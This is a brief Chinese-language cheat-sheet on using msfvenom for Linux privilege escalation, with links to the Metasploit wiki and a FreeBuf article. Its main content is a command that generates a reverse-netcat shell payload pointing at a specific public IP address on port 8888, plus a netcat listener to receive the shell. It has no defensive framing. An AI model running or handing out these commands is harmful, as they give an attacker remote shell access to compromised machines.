> msfvenom payload 提权

> [github](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)

> [linx 提权](http://www.freebuf.com/articles/system/176255.html)

ubuntu 安装
--
````
apt install postgresql

# 生成 payload
msfvenom -p cmd/unix/reverse_netcat lhost=118.31.78.77 lport=8888 R     

# 监听
nc -lvp 8888
````
